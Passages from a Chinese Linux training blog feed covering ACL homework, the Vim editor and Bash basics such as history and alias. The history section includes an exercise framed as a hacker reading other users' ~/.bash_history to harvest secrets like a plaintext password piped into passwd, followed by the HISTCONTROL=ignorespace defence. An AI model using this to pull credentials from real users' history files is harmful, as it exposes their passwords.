<h3 id="ACL-权限作业"><a href="#ACL-权限作业" class="headerlink" title="ACL 权限作业"></a>ACL 权限作业</h3><ol>
<li>在 /tmp 下创建一个 file 文件 , 要求 student 用户对 file 有完整 的权限 ,kevin 用户对<br>file 有 rw- 的权限 ,carol 用户对 file 有 -wx 的权限 ,natasha 用户对该文件有 r– 的权限。</li>
<li>清空 file 的 attr 权限。</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Vim 编辑器</title>
    <url>/2016/12/22/booboo_linux_base/06-Vim%E7%BC%96%E8%BE%91%E5%99%A8/</url>
    <content><![CDATA[<h2 id="Vim-简介"><a href="#Vim-简介" class="headerlink" title="Vim 简介"></a>Vim 简介</h2><p><img src="pic/10.png" alt="10.png"></p>
<p>Vim 是 Linux 系统上的最著名的文本/ 代码编辑器,也是早年的 Vi编辑器的加强版，而 gVim 则是其 Windows 版。它的最大特色是完全使用键盘命令进行编辑，脱离了鼠标操作虽然使得入门变得困难,但上手之后键盘流的各种巧妙组合操作却能带来极为大幅的效率提升。</p>
<p>因此 Vim 和现代的编辑器(如 Sublime Text)有着非常巨大的差异,而且入门学习曲线陡峭,需要记住很多按键组合和命令,如今被看作是高手、Geek 们专用的编辑器。尽管 Vim 已经是古董级的软件,但还是有无数新人迎着困难去学习使用,可见其经典与受欢迎程度。</p>
<p>另外,由于 Vim 的可配置性非常强,各种插件、语法高亮配色方案等多不胜数,无论作为代码编辑器或是文稿撰写工具都非常给力！</p>
<p>在 Linux 系统中配置应用服务,实际上就是在修改它的配置文件(配置文件可能有多个,其中包含不同的参数), 而且日常工作中也一定免不了编写文档的事情吧, 这些都是要通过文本编辑器来完成的。</p>
<p>在热门 Linux 操作系统中都会默认安装vim。</p>
<h3 id="Vim-难以驾驭的神器"><a href="#Vim-难以驾驭的神器" class="headerlink" title="Vim - 难以驾驭的神器"></a>Vim - 难以驾驭的神器</h3><p>神器总是很难驾驭的,主角总得付出一些努力才能收获到更加强大的力量,对于 Vim 这种上古神器来说更是如此。由于它全程使用键盘操作,你必须记住一堆快捷键、按键组合以及各种命令才能开始使用,很多首次接触 Vim 的人会觉得越学越复杂而中途放弃。然而,坚持下来的朋友就会渐渐地发现这种键盘流操作的设计绝妙之处!</p>
<p>如果你是一位 IT 界人士,需要或将要与 Linux 系统打交道,那么学习好 Vim 的操作绝对能让你的工作轻松百倍!!</p>
<p>因为很多时候, Linux 作为服务器是不会开启图形界面,当需要远程操作时,你只能利用SSH“ 命令字符式 ” 的 Shell 界面对其进行操作,这时如果你需要修改服务器上的网页代码或配置文件,VI或 VIM 命令就是你最佳最方便也是最强大的伙伴了!相信我,学好 数理化 VIM ,走遍天下也不怕！</p>
<h3 id="Vim-入门帮助"><a href="#Vim-入门帮助" class="headerlink" title="Vim 入门帮助"></a>Vim 入门帮助</h3><p><img src="pic/11.png" alt="11.png"></p>
<p>下面首先对 Vim 做一下最基本的介绍,并给出一些参考信息,以方便对 Vim 不熟悉的读者也能够理解并自<br>己查阅进一步信息。</p>
<p>Vim 带有完整的帮助文档。</p>
<ol>
<li>进入 Vim 后输入 “ :help”即可访问</li>
<li>新手在操作系统的命令行上输入 vimtutor 命令即可开始学习一个简单的 30 分钟的 Vim 教程2 Vim 命令</li>
</ol>
<h3 id="Vim-模式介绍"><a href="#Vim-模式介绍" class="headerlink" title="Vim 模式介绍"></a>Vim 模式介绍</h3><p><img src="pic/12.png" alt="12.png"></p>
<p>与大部分其它编辑器不同,进入 Vim 后,缺省状态下键入的字符并不会插入到所编辑的文件之中。Vim 的<br>模式(mode ,可以简单地理解为 “ 状态 ” )概念非常重要。需要知道,Vim 有以下几个模式:</p>
<ul>
<li>正常(normal)模式,缺省的编辑模式;下面如果不加特殊说明,提到的命令都直接在正常模式下<br>输入;任何其它模式中都可以通过键盘上的 Esc 键回到正常模式。</li>
<li>命令(command)模式 ,用于执行较长、较复杂的命令;在正常模式下输入 “ :” (一般命令)、 “ /”<br>(正向搜索)或 “ ?”(反向搜索)即可进入该模式;命令模式下的命令要输入回车键(Enter)才算完成。</li>
<li>插入(insert)模式 ,输入文本时使用;在正常模式下键入 “ i”(insert )或 “ a”(append)即可<br>进入插入模式(也有另外一些命令,如 “ c”,也可以进入插入模式,但这些命令有其它的作用)。</li>
<li>可视(visual)模式 ,用于选定文本块;可以在正常模式下输入 “ v”(小写)来按字符选定,输入<br>“V” (大写)来按行选定,或输入 “ Ctrl-V”来按方块选定。</li>
<li>选择(select)模式 ,与普通的 Windows 编辑器较为接近的选择文本块的方式;在以可视模式和<br>选择模式之一选定文本块之后,可以使用 “ Ctrl-G” 切换到另一模式 —— 该模式很少在 Linux 上使用,本<br>文中就不再介绍了。</li>
</ul>
<h3 id="正常模式"><a href="#正常模式" class="headerlink" title="正常模式"></a>正常模式</h3><p><img src="pic/13.png" alt="13.png"></p>
<h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><p><img src="pic/14.png" alt="14.png"></p>
<h3 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h3><ul>
<li>i 光标所在位置插入</li>
<li>I 光标所在位置行首插入</li>
<li>o 光标所在位置下方新开一行插入</li>
<li>O 光标所在位置上方新开一行插入</li>
<li>a 光标所在位置下一个字符的位置插入</li>
<li>A 光标所在位置行行尾插入</li>
</ul>
<h2 id="Vim-实例"><a href="#Vim-实例" class="headerlink" title="Vim 实例"></a>Vim 实例</h2><p>本实例作为基础教程,拓展部分见附录《Vim 用户手册中文版 7.2》</p>
<p><img src="pic/15.png" alt="15.png"></p>
<h3 id="Vim-第一步"><a href="#Vim-第一步" class="headerlink" title="Vim 第一步"></a>Vim 第一步</h3><h4 id="首次运行-Vim"><a href="#首次运行-Vim" class="headerlink" title="首次运行 Vim"></a>首次运行 Vim</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mastera0 ~]# ll file1</span><br><span class="line">-rw-r--r--. 1 root root 274 Jun 24 12:19 file1</span><br><span class="line">[root@mastera0 ~]# vim file1</span><br></pre></td></tr></table></figure>

<p>使 Vim 开始编辑一个名为 file1 的文件。屏幕上看起来大致是这样:</p>
<ul>
<li>“黑色块” 代表当前光标位置;</li>
<li>上波浪线(~)表示所在行并不是文件内容的一部分。换句话说,Vim 将 文件之外的部分显示为波浪线;</li>
<li>在窗口的底部, 一个消息行显示说当前正 在编辑的文件叫 file1,它有 16 行,274 个字符。但前光<br>标所在位置为第一行的第一位</li>
</ul>
<p><img src="pic/16.png" alt="16.png"></p>
<p>如果是新文件呢?</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mastera0 ~]# vim file</span><br></pre></td></tr></table></figure>

<p><img src="pic/17.png" alt="17.png"></p>
<p>在窗口的底部, 一个消息行显示说当前正 在编辑的文件叫 file,并且它是一个新文件。</p>
<h4 id="插入文本"><a href="#插入文本" class="headerlink" title="插入文本"></a>插入文本</h4><p>Vim 编辑器是一个模式编辑器。这意味着在不同状态下编辑器有不同 的行为模式。两个基本的模式 Normal<br>模式和 Insert 模式。在 Normal 模式下你键入的每一个字符都被视为一个命令。而在 Insert 模式下键入<br>的字符 都作为实际要输入的文本内容。 刚启动时 Vim 工作于 Normal 模式。要进入 Insert 模式你需要使<br>用”i” 命 令(i 意为 Insert)。接下来就可以直接输入了。别怕出错, 错了还可以修 改。比如下面这首程序<br>员的打油诗:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A very intelligent turtle</span><br><span class="line">Found programming UNIX a hurdle</span><br></pre></td></tr></table></figure>
<p>“turtle” 之后你按下回车键另起一行。最后按下 <Esc> 键退出 Insert 模式 ,回到 Normal 模式。现在你的Vim 窗口中有了这样的两行内容 :</p>
<p><img src="pic/18.png" alt="18.png"></p>
<p>现在是什么模式?</p>
<p>要知道你现在所处的工作模式是什么,打开显示模式的开关:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:set showmode</span><br><span class="line">:set noshowmode 关闭显示模式</span><br></pre></td></tr></table></figure>

<p><img src="pic/19.png" alt="19.png"></p>
<p>你会看到按下冒号键之后当前光标跑到窗口的最后一行去了。那是使用冒 号命令的地方(顾名思义,冒号命<br>令就是总是以冒号打头的命令) 。最后按 下回车键结束整个命令(所有的冒号命令都以这种方式表明命令的<br>结束).</p>
<p>现在,如果你键入了”i”命令 Vim 就会在窗口底部显示–INSERT– 。这 表明你目前处于 Insert 模式。<br>如 果 按 下<Esc> 键 返 回 到 Normal 模 式 刚 才 显 示 出 来 的 模 式”–INSERT– 就会消失 ;Normal模式并不会显示 — NORMAL–,作为默认的工作模式它不显示任何字串。</p>
<p>Vim 新手最头痛的问题就是模式—经常忘记自己置身于何种模式, 或者不经意敲了哪个字符就切换到别的<br>模式去了。</p>
<p>不管你当前所处的模 式是什么,按下<Esc>都会让你回到 Normal 模式(即使已经在 Normal 模式 下)。有时<br>需要按两次<Esc>,如果 Vim 以一声蜂鸣回答你, 那说明你已经 是在 Normal 模式了。</p>
<h4 id="移动光标"><a href="#移动光标" class="headerlink" title="移动光标"></a>移动光标</h4><p>回到 Normal 模式后 , 你就可以用下面的命令来移动光标 :</p>
<ul>
<li>h 左</li>
<li>j 下</li>
<li>k 上</li>
<li>l 右</li>
</ul>
<p>人们一开始会认为这些字符是随意选取的。毕竟有谁 l 来代 表 right 呢 ? 但事实上 , 这些字符都是精心挑选的 :</p>
<p>在编辑器中移动光 标是十分常用的操作 , 这些字符在键盘上都分布在你右手周围。这样的安 排可以使你最快<br>最方便地使用它们 ( 尤其是对那些用十个手指而不是二指 禅用户而言 ) 。</p>
<p>备注 : 同时你还可以用箭头键来移动光标。不过这样做实 际上会大大降低你的效率。因为用这些键你需要不<br>停地在 字母区和箭头键之间频繁转换。想象一下要是你在一小时 内这样做一百次会占用你多少时间 ? 另外 , 并<br>不是每个键 盘上都安排有箭头键 , 或者都把它们放在最常见的位置 ; 所以使用 hjkl 还是大有好处。</p>
<p>练习文件名位 hjkl ,放在共享当中。如果进入了插入模式不要忘了要用 <Esc> 回到 Normal 模 式。 |<br>vimtutor| 也是学习这些命令的一个好去处。</p>
<p>记住:学习这些命令的最好办法不是使用什么记忆法 , 而是练习。</p>
<h4 id="删除字符"><a href="#删除字符" class="headerlink" title="删除字符"></a>删除字符</h4><p>要删除一个字符,只需要将光标移到该字符上按下”x”. ( 这是在追 忆古老的打字机时代,在打字机上删除字<br>符就是用 xxxx 来覆盖它) 把光标 移到上面例子中的第一行,键入 xxxxxxx(7 个 x) 来删除”A very “。</p>
<p>输入其它内容<br>比如:首先键入的命令是 i( 进 入 Insert 模 式), 接着插入”A young”, 然后 退 出 Insert 模式(最后的<Esc>)。</p>
<p>删除一行</p>
<p>删除一整行内容使用”dd”命令。删除后下面的行会移上来填补空缺:2.1.5 撤消与重做</p>
<p>撤销一次操作</p>
<p>如果你误删了过多的内容。显然你可以再输入一遍,但是命令”u” 更 简便, 它可以撤消上一次的操作 1 。<br>实际看一下它的效果,用”dd” 命令来 删除前面例子中的第一行内容,”u”命令会把它找回来。</p>
<p>重做<br>如果你撤消了多次,你还可以用 CTRL-R(重做) 来反转撤消的动作。换 句话说,它是对撤消的撤消。</p>
<p>撤销一行操作</p>
<p>撤消命令还有另一种形式,”U”命令, 它一次撤消对一行的全部操作。第 二次使用该命令则会撤消前一<br>个”U”的操作。</p>
<ul>
<li>删除 very</li>
<li>删除 turtle</li>
<li>用”u”撤消”U”</li>
<li>用”U” 恢复该行</li>
</ul>
<p>“U”命令本身也造成了一次改变,这种改变同样可以用”u” 命令 和 CTRL-R 来撤消和重做。看起来这很容易<br>把人搞糊涂,不过别担心, 用”u”和 CTRL-R 你可以找回任何一个操作状态。</p>
<h4 id="其它编辑命令"><a href="#其它编辑命令" class="headerlink" title="其它编辑命令"></a>其它编辑命令</h4><p>Vim 有一大堆命令来改变文本。这里仅列 出一些最常用的。</p>
<p>追加 a</p>
<p>“i” 命令可以在当前光标之前插入文本。但如果你想在当前行的末尾 添加一些内容时怎么办呢?你必需在光<br>标之后插入文本。答案是用”a” 命 令来代替”i”。</p>
<p>另起一行 o\O</p>
<ol>
<li>“o”命令可以在当前行的下面另起一行,并使当前模式转为 Insert 模 式。这样你可以在该命令之后直接输<br>入内容。假设光标位于下面两行中第 一行的某处:</li>
<li>“O”命令(注意是大写的字母 O)将在当前行的上面另起一行。</li>
</ol>
<p>使用命令计数</p>
<p>假设你要向上移动 9 行。这可以用”kkkkkkkkk”或”9k” 来完成。事实 上,很多命令都可以接受一个数字作<br>为重复执行同一命令的次数。比如刚 才的例子,要在行尾追加三个感叹号,当时用的命令是”a!!!<Esc>“。<br>另 一个办法是用”3a!<Esc>“命令。</p>
<p>3 说明该命令将被重复执行 3 次。同样, 删 除 3 个字符可以用”3x”。指<br>定的数字要紧挨在它所要修饰的命令前面。</p>
<h4 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h4><p>要退出 Vim,用命令”ZZ”。该命令保存当前文件并退出 Vim.</p>
<p>放弃编辑 :q!</p>
<p>有时你会在做了一连串修改之后突然意识到最好是放弃所有的修改重 新来过。别担心。Vim 中有一个命令可<br>以丢弃所有的修改并退出:<br>:q!<br>别忘了在命令之后加回车。</p>
<p>放弃编辑并重新载入 :e!</p>
<p>如果你在放弃所有修改后还想以该文件的初始内容作为开始继续编 辑,还可以用”:e!”命令放弃所有修改并<br>重新载入该文件的原始内容。</p>
<p>保存并退出:wq :wq!</p>
<p>一般我们都是需要保存并退出的,有一些文件保存的时候需要强制保存退出,这时加上!即可。比<br>如/etc/shadow2.1.8 求助</p>
<p>你想做的任何操作都可以在 Vim 的帮助文件里找到答案, 别怕问问 题!<br>:help</p>
<p>会带你到帮助文件的起始点。</p>
<p>如果你没有指定一个具体的帮助主题,”:help” 命令会显示上面提到 的帮助文件的起点。Vim 的作者聪明地<br>(也许是懒惰地) 设计了它的帮助系 统: 帮助窗口也是一个普通的编辑窗口。你可以使用跟编辑其它文件时一<br>样的命令来操作帮助文件。比如用 hljk 移动光标。</p>
<p>退出帮助窗口也跟退出其它文件编辑窗口一样,使用”ZZ” 即可。这只 会关闭帮助窗口,而不是退出 Vim.<br>浏览帮助文件时,你会注意到有一些内容用两个小栅栏围了起来( 比 如|help|)。这表明此处是一个超链接。<br>如果你把光标置于两个小栅栏之间的任何位置然后按下 CTRL-](跳转到一个标签的命令),帮助系统就会带<br>你 到那个指定的主题。(因为一些此处不便讨论的原因,在 Vim 的术语中这种 超链接叫标签。所以 CTRL-]<br>可以跳转到当前光标之下的那个 word 所对应的 链接中 1 。</p>
<p>几次跳转之后,你可能想回到原来的某个地方,CTRL-T(弹出标签) 可 以回到前一个位置。用命令 CTRL-<br>O(跳转到较早的位置) 也可以。 帮助窗口的开始有一个关于<em>help.txt*的说明。在星号”</em>“ 之间的字 符被<br>帮助系统定义为一个标签的目的地(超链接的目的地).</p>
<p>要查看关于某个特殊主题的帮助,使用下面的命令形式:<br><code>:help {subject}</code></p>
<p>例如,查看关于 showmode 的帮助<br><code>:help showmode3.2 改动</code></p>
<h4 id="光标的指定移动"><a href="#光标的指定移动" class="headerlink" title="光标的指定移动"></a>光标的指定移动</h4><p>“G”命令 指定一 个命令计数, 这个命令就会把光标定位到由命令计数指定的行上。比 如”33G”就会把光标<br>置于第 33 行上。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mastera0 ~]# cp /var/log/messages messages</span><br><span class="line">[root@mastera0 ~]# vim messages</span><br></pre></td></tr></table></figure>

<p>没有指定命令计数作为参数的话 :</p>
<ul>
<li>“G” 会 把 光 标 定 位 到 最 后 一 行 上</li>
<li>“gg”命令是跳转到第一行的快捷的方法。”1G”效果也是一样, 但是敲 起来就没那么顺手了。</li>
<li>“%”命令 另一个移动到某行的方法是在命令”%” 之前指定一个命令计数 。 如”50%”将会把光标定位在文件的中间;比”90%” 跳到接文件尾的地 方 。</li>
</ul>
<h4 id="简单搜索"><a href="#简单搜索" class="headerlink" title="简单搜索"></a>简单搜索</h4><p>“/string”命令</p>
<p>“/string”命令可用于搜索一个字符串。比如要找到单词”mysql”, 使用命令:<br><code>/mysql</code></p>
<p>要查找上次查找的字符串的下一个位置。使用”n” 命令。如果你知 道你要找的确切位置是目标字符串的第几<br>次出现,还可以在”n” 之前放置 一个命令计数。”3n”会去查找目标字符串的第 3 次出现。向光标所在位置以<br>上查找用”N”。</p>
<p>“?string”命令</p>
<p>“?”命令与”/“的工作相同,只是搜索方向相反。比如要找到单词”mysql”, 使用命令:<br><code>?mysql忽略大小写</code></p>
<p>通常情况下你要准确地键入你要查找的东西。如果你并不关心目标字 符中字母的大小写,可以通过设<br>置’ignorecase’选项:<br><code>:set ignorecase</code></p>
<p>取消则设置’noignorecase’选项:<br><code>:set noignorecase</code></p>
<p>如果你在编辑一段源程序时看到了一个叫”nr” 的变量。你想查看一 下这个变量就被用在了哪些地方。简单<br>的办法是把光标移到”nr” 上然后 用”*” 命令和”n” 命令一个一个地查找所有的匹配。<br>不过还有更好的办法。使用下面的命令:<br><code>:set hlsearch</code></p>
<p>现在你要再查找”nr”, Vim 就会以某种形式高亮显示所有符合的匹配。对 于想查看一个变量被用在哪些地<br>方,这个办法太棒了, 不需任何其它的命 令 看得眼花的时候还可以关闭这一功能:<br><code>:set nohlsearch</code></p>
<p>不过你要在下次搜索时再次使用这一功能就又得打开它。如果你只是想去 掉当前的高亮显示,可以使用下面<br>的命令 :<br><code>:nohlsearch</code></p>
<h4 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h4><p>要把文本内容从一处复制到另一处</p>
<ol>
<li>先删除 dd 再粘贴 p</li>
<li>“y” 操作符命令会把文本复制到一个寄存器 中。然后可以用”p”命令把它取回。</li>
</ol>
<p>“y”命令</p>
<ul>
<li>“yw”来复制一个 word;</li>
<li>“y2w”命令复制两个 word;</li>
<li>“yy”复制一行;</li>
<li>“3yy”复制光标所在行和向下的行,一共三行;</li>
</ul>
<p>例如:</p>
<ol>
<li>复制 file 文件中的 turtle 并粘贴到该行的最后;</li>
<li>复制 file 文件中的 intelligent turtle 并粘贴到该行的最后;</li>
<li>复制 file 文件中的第二行并粘贴到第四行;</li>
<li>复制 file 文件中的第一行第二行第三行,并粘贴到第五行第六行第七行。</li>
</ol>
<h4 id="替换字符"><a href="#替换字符" class="headerlink" title="替换字符"></a>替换字符</h4><ul>
<li>:s/UNIX/linux 对光标所在行第一个出现的 UNIX 替换成 linux</li>
<li>:s/UNIX/linux /g 对光标所在行所有 UNIX 都替换成 linux , g 表示全行替换</li>
<li>:% s/UNIX/linux /g 将全文中的 carol 都替换位 natasha , “%” 指定该命令将作用于所有行上</li>
</ul>
<h3 id="Vim-的保护机制"><a href="#Vim-的保护机制" class="headerlink" title="Vim 的保护机制"></a>Vim 的保护机制</h3><p>如果我们没有通过 q 退出,而是通过其他方式强行退出,比如说直接关终端,会导致 vim 的一个报错,当我<br>们下次打开这个文件的时候,会提示<br><code>Found a swap file by the name &quot;.file.swp&quot;</code></p>
<p>这是因为 vim 他不是实时写入的机制,他会先把文件写到内存,等我们执行 w 操作以后,再写回到原文件。<br>那么在写回原文件,或者执行 q 的放弃操作之前,会生成一个临时的文件,以 . 开头, swp 结尾。当我们看<br>到这种情况,就说明这个文件是在变编辑的过程中强制退出的,或者是正在被人编辑。</p>
<p>所以这个文件的作用就是防止强制退出造成的数据安全隐患,和防止文件同时被多次修改。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Swap file ".file.swp" already exists!</span><br><span class="line">[O]pen Read-Only, (E)dit anyway, (R)ecover, (D)elete it, (Q)uit, (A)bort:</span><br></pre></td></tr></table></figure>

<p>我们可以根据他的提示执行相应的操作,比如说 Q ,退出。如果想要顺利编辑这个文件的话,一方面可以使<br>用 E ,无论如何也要编辑,或者先退出,把 swp 文件删除了以后再编辑,也是可以的。</p>
<p>注意:要使用 vim 需要注意一下权限问题,必须要有读写权限才能使用 vim 。</p>
<p>可以看一下没有写权限和没有读权限会出现什么问题。</p>
<hr>
<h2 id="Vim-编辑器课后作业"><a href="#Vim-编辑器课后作业" class="headerlink" title="Vim 编辑器课后作业"></a>Vim 编辑器课后作业</h2><ol>
<li>复制<code>/etc/sysconfig/network-scripts/ifcfg-eth0</code>的配置文件位/tmp/test</li>
<li>使用vim编辑该文件，练习不同模式的切换，尤其是正常变插入模式的几种用法</li>
<li>练习保存的几种命令，包括保存退出，不保存退出。</li>
<li>vim练习游戏<br> vim大冒险官网    vim-adventures.com</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Bash简介</title>
    <url>/2016/12/22/booboo_linux_base/07-Bash%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h2 id="SHELL"><a href="#SHELL" class="headerlink" title="SHELL"></a>SHELL</h2><h3 id="shell-简介"><a href="#shell-简介" class="headerlink" title="shell 简介"></a>shell 简介</h3><p>Shell 是一个命令解释器, 是人与操作系统之间的桥梁。 我们平时无论任何操作,最终都要操作硬件,比如输入一个字符 “ a ”, 那么信号 首先会从键盘传递到主板,通过主板总线传递到内存,CPU,显卡等,最终经过显卡的运 算完成后在屏幕的某个位置, 显示一个特定字体的字符 “ a ”, 这一整个过程可以说是 不断的和硬件打交道了,但是如果让人去发送这些硬件操作码显然不适合, 因为这不是人干 的事,所以我们有了操作系统,操作系统通过加载一定的硬件驱动,从而控制硬件,操作硬件,那剩下的事就是如何和操作系统通信了,对于普通的系统管理员来说,这也是一件非常困难的事,为了方便人和操作系统沟通, 我们开发了 shell 。</p>
<p>Shell 可以将我们平时运行的一些指令解释给操作系统执行, 方便管理员操作系统。而 Shell 的脚本其实是一种命令的堆积,我们将所有需要执行的命令, 以从上至下的方 式写在一个文件当中, 交给 shell 去自动解释执行。</p>
<h3 id="shell-历史"><a href="#shell-历史" class="headerlink" title="shell 历史"></a>shell 历史</h3><p>在 AT&amp;T 的 Dennis Ritchie 和 Ken Thompson 设计 UNIXTM 的时候, 他们想要为 用户创建一种与他们的新系统交流的方法。那时的操作系统带有命令解释器。命令解释器接受用户的命令,然后解释它们,因而计算机可以使用这些命令。 但是 Ritchie 和 Thompson 想要的不只是这些功能,他们想提供比当时的命令解释器 具备更优异功能的工具。这导致了 Bourne shell ( 通称为 sh )的开发, 由 S.R. Bourne 创建。自从 Bourne shell 的创建, 其它 shell 也被一一开发, 如 C shell ( csh ) 和 Korn shell (ksh ) 。</p>
<p>当自由软件基金会想寻求一种免费的 shell , 开发者们开始致力于 Bourne shell 以及当 时其它 shell中某些很受欢迎的功能背后的语言。 这个开发结果是 Bourne Again Shell , 或称 bash 。虽然你的Red Hat Linux 包括几 种不同的 shell , bash 是为互动用户提供的默认 shell 。</p>
<h3 id="常见的-shell"><a href="#常见的-shell" class="headerlink" title="常见的 shell"></a>常见的 shell</h3><ul>
<li>Bourne shell 即 sh : AT&amp;T 贝尔实验室编写的一个交换式的命令解释器。</li>
<li>C Shell : Bill Joy 于 20 世纪 80 年代早期开发。为了让用户更容易的使用, 他把语法结构变成了 C语言风格。它新增了命令历史、别名、文件名替换、作业控制等功能。</li>
<li>korn shell (ksh) 是一个 Unix shell 。它由贝尔实验室的 David Korn 在二十世纪八十 年代早期编写。它完全向上兼容 Bourne shell 并包含了 C shell 的很多特性。</li>
<li>Bourne-Again SHell : bash 是一个为 GNU 项目编写的 Unix shell 。它的名字是一 系列缩写:Bourne-Again SHell — 这是关于 Bourne shell ( sh )的一个双关语( Bourne again / bornagain ) 。 Bourne shell 是一个早期的重要 shell , 由 Stephen Bourne 在 1978 年前后编写,并同 Version 7 Unix 一起发布。 bash 则在 1987 年由 Brian Fox 创造。 在 1990 年, ChetRamey 成为了主要的维护者。 bash 是大多数 Linux 系统以及 Mac OS X v10.4 默认的 shell ,它能运行于大多数 Unix 风格的操作系统之上, 甚至被移植到了 Microsoft Windows 上的 Cygwin 和MSYS 系统中, 以实现 windows 的 POSIX 虚拟接口。此外, 它也被 DJGPP 项目移植到了 MS- DOS 上。</li>
<li>POSIX shell : POSIX shell 与 Korn shell 非常的相似, 当前提供 POSIX shell 的最大卖主是Hewlett-Packard 。</li>
</ul>
<h3 id="为什么-Shell"><a href="#为什么-Shell" class="headerlink" title="为什么 Shell"></a>为什么 Shell</h3><ul>
<li>解决重复操作的作业。</li>
<li>节约时间 , 提高工作效率。</li>
<li>功能强大,使用简单</li>
</ul>
<h3 id="etc-shells"><a href="#etc-shells" class="headerlink" title="/etc/shells"></a>/etc/shells</h3><p><code>/etc/shells</code> 文件记录了目前系统中注册过的 shell,每一个用户可以使用一种 shell,可以通过<code>usermod -s</code> 来修改用户 shell,也可以通过<code>chsh</code> 来更改 shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@redhat6 tmp]# chsh carol</span><br><span class="line">Changing shell for carol.</span><br><span class="line">New shell [/bin/csh]: /bin/sh</span><br><span class="line">Shell changed.</span><br><span class="line">[root@redhat6 tmp]# su - carol</span><br><span class="line">-sh-4.1$ tail /etc/passwd -n1</span><br><span class="line">carol:x:60000:60000:carol:/home/carol:/bin/sh</span><br><span class="line">-sh-4.1$</span><br></pre></td></tr></table></figure>

<h2 id="bash-功能"><a href="#bash-功能" class="headerlink" title="bash 功能"></a>bash 功能</h2><h3 id="history-功能"><a href="#history-功能" class="headerlink" title="history 功能"></a>history 功能</h3><p>history 命令用于显示指定数目的指令命令,读取历史命令文件中的目录到历史命令缓冲区和将历史命令缓冲区中的目录写入命令文件。 该命令单独使用时,仅显示历史命令,在命令行中,可以使用符号!执行指定序号的历史命令。</p>
<p>例如,要执行第 2 个历史命令,则输入<code>!2</code>。</p>
<p>历史命令是被保存在内存中的,当退出或者登录 shell 时,会自动保存或读取。在内存中,历史命令仅能够存储 1000 条历史命令,该数量是由环境变量 <code>HISTSIZE</code> 进行控制。</p>
<p>HISTSIZE 变量 –变量:反复调用的值,以$符号引用</p>
<p>定义方式:histsize 数字 临时生效</p>
<p>/etc/profile 里永久定义</p>
<p>保存位置:~/.bash_history</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 history(选项)(参数)</span><br><span class="line"></span><br><span class="line">选项 -c :清空当前历史命令;</span><br><span class="line">-a :将历史命令缓冲区中命令写入历史命令文件中;</span><br><span class="line">-r :将历史命令文件中的命令读入当前历史命令缓冲区;</span><br><span class="line">-w:将当前历史命令缓冲区命令写入历史命令文件中。</span><br><span class="line"></span><br><span class="line">参数 打印最近的 n 条历史命令</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">!8 使用第八个命令</span><br><span class="line">!Ser 使用该字符串开头的最近的命令</span><br><span class="line">!!调用上一条命令</span><br><span class="line">!$ 调用上一个命令的参数 = alt+.</span><br><span class="line">Ctrl+R 搜索最近包含字符串的命令</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">history</span><br><span class="line">	命令用法</span><br><span class="line">	history</span><br><span class="line">		-c	清空缓存</span><br><span class="line">		-r  	将~/.bash_history历史命令读入缓存</span><br><span class="line"></span><br><span class="line">		方便的调用	！num</span><br><span class="line">				!! 调用最近一次的命令</span><br><span class="line">				!关键字 		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	实战	1.你是黑客，窃取别人的历史命令</span><br><span class="line">		~/.bash_history</span><br><span class="line">		2.为了防止黑客，你怎么防止一些关键命令被窃取，比如配置用户密码，或者数据库密码等</span><br><span class="line">	[root@rhel7 ~]# echo "uplooking123"|passwd --stdin superman</span><br><span class="line">	Changing password for user superman.</span><br><span class="line">	passwd: all authentication tokens updated successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		1）清缓冲</span><br><span class="line">		2）删除文件</span><br><span class="line"></span><br><span class="line">		[root@rhel7 ~]# export HISTCONTROL=ignorespace</span><br><span class="line">		[root@rhel7 ~]# echo 1</span><br><span class="line">		1</span><br><span class="line">		[root@rhel7 ~]# echo 2</span><br><span class="line">		2</span><br><span class="line">		[root@rhel7 ~]#  echo 3</span><br><span class="line">		3</span><br><span class="line">		[root@rhel7 ~]# history</span><br><span class="line">		1  HISTCONTROL=ignorespace</span><br><span class="line">		2  exprot HISTCONTROL=ignorespace</span><br><span class="line">		3  export HISTCONTROL=ignorespace</span><br><span class="line">		4  echo 1</span><br><span class="line">		5  echo 2</span><br><span class="line">		6  history</span><br></pre></td></tr></table></figure>

<h3 id="别名-alias"><a href="#别名-alias" class="headerlink" title="别名 alias"></a>别名 alias</h3><p>alias 命令用来设置指令的别名。我们可以使用该命令可以将一些较长的命令进行简化。使用 alias 时,用户必须使用单引号’’ 将原来的命令引起来,防止特殊字符导致错误。 alias 命令的作用只局限于该次登入的操作。若要每次登入都能够使用这些命令别名,则可将相应的 alias 命令存放到 bash 的初始化文件/etc/bashrc 中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 alias(选项)(参数)</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line">-p :打印已经设置的命令别名。</span><br><span class="line"></span><br><span class="line">参数 命令别名设置:定义命令别名,格式为 “ 命令别名=‘ 实际命令 ’” 。</span><br><span class="line"></span><br><span class="line">实例 alias 新的命令=' 原命令 -选项/参数'</span><br><span class="line">alias grep=’grep --color=auto’</span><br></pre></td></tr></table></figure>

<ul>
<li>~/.bashrc 针对单个用户生效</li>
